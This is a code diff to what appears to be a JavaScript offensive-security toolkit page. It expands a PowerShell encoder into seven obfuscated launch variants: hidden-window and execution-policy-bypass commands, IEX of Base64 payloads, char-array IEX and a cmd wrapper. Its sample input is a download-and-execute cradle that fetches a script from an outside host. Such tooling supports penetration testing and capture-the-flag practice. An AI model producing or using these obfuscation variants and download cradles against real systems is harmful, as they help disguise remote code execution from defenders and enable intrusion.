@@ -3419,7 +3419,7 @@ TOOLS['revshell'] = {
 // ===== POWERSHELL ENCODER (-EncodedCommand, Base64 UTF-16LE) =====
 TOOLS['ps-encode'] = {
   title: 'PowerShell Encoder',
-  desc: 'Encode a PowerShell command to -EncodedCommand (Base64, UTF-16LE)',
+  desc: 'Encode a PowerShell command into multiple execution / obfuscation variants',
   render() {
     return `
       <div class="tool">
@@ -3430,33 +3430,44 @@ TOOLS['ps-encode'] = {
             <textarea id="pe-in" placeholder="IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')"></textarea>
           </div>
         </div>
-        <div class="card">
-          <div class="result-header"><h4>EncodedCommand (Base64, UTF-16LE)</h4><button class="btn btn-ghost" id="pe-copy-b64">Copy</button></div>
-          <pre class="not-pre mono" id="pe-b64"></pre>
-        </div>
-        <div class="card">
-          <div class="result-header"><h4>Full command</h4><button class="btn btn-ghost" id="pe-copy-full">Copy</button></div>
-          <pre class="not-pre mono" id="pe-full"></pre>
-        </div>
+        <div id="pe-out"></div>
       </div>`;
   },
   init() {
-    const enc = (s) => {
-      let bin = '';
-      for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); bin += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff); }
-      return btoa(bin);
-    };
-    const upd = () => {
+    const u16 = (s) => { let b = ''; for (let i = 0; i < s.length; i++) { const c = s.charCodeAt(i); b += String.fromCharCode(c & 0xff) + String.fromCharCode((c >> 8) & 0xff); } return btoa(b); };
+    const u8 = (s) => { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return btoa(s); } };
+    const VARIANTS = [
+      ['EncodedCommand (Base64 UTF-16LE)', c => u16(c)],
+      ['Full: powershell -EncodedCommand', c => 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ' + u16(c)],
+      ['Base64 (UTF-8)', c => u8(c)],
+      ['IEX FromBase64 (Unicode)', c => `powershell -nop -c "IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${u16(c)}')))"`],
+      ['IEX FromBase64 (UTF-8)', c => `powershell -nop -c "IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${u8(c)}')))"`],
+      ['Char array (IEX)', c => 'powershell -nop -c "IEX(([char[]](' + [...c].map(ch => ch.charCodeAt(0)).join(',') + ') -join \'\'))"'],
+      ['cmd /c (encoded)', c => 'cmd.exe /c powershell.exe -NoP -W Hidden -Enc ' + u16(c)],
+    ];
+    const out = $('#pe-out');
+    let cur = 0;
+    const render = () => {
       const cmd = $('#pe-in').value;
-      if (!cmd) { $('#pe-b64').textContent = ''; $('#pe-full').textContent = ''; return; }
-      const b64 = enc(cmd);
-      $('#pe-b64').textContent = b64;
-      $('#pe-full').textContent = 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ' + b64;
+      if (!cmd) { out.innerHTML = ''; return; }
+      out.innerHTML = `
+        <div class="card">
+          <div class="not-formats">${VARIANTS.map(([n], i) => `<button class="not-fmt" data-i="${i}">${escapeHtml(n)}</button>`).join('')}</div>
+          <div class="result-header"><h4 class="not-fmt-title"></h4><button class="btn btn-ghost" id="pe-copy">Copy</button></div>
+          <pre class="not-pre mono" id="pe-result"></pre>
+        </div>`;
+      const show = (i) => {
+        cur = i;
+        $('#pe-result', out).textContent = VARIANTS[i][1](cmd);
+        $('.not-fmt-title', out).textContent = VARIANTS[i][0];
+        $$('.not-fmt', out).forEach((b, j) => b.classList.toggle('active', j === i));
+      };
+      $$('.not-fmt', out).forEach(b => b.addEventListener('click', () => show(+b.dataset.i)));
+      $('#pe-copy', out).addEventListener('click', () => copy($('#pe-result', out).textContent));
+      show(Math.min(cur, VARIANTS.length - 1));
     };
-    $('#pe-in').addEventListener('input', upd);
-    $('#pe-copy-b64').addEventListener('click', () => copy($('#pe-b64').textContent));
-    $('#pe-copy-full').addEventListener('click', () => copy($('#pe-full').textContent));
-    upd();
+    $('#pe-in').addEventListener('input', render);
+    render();
   }
 };
 
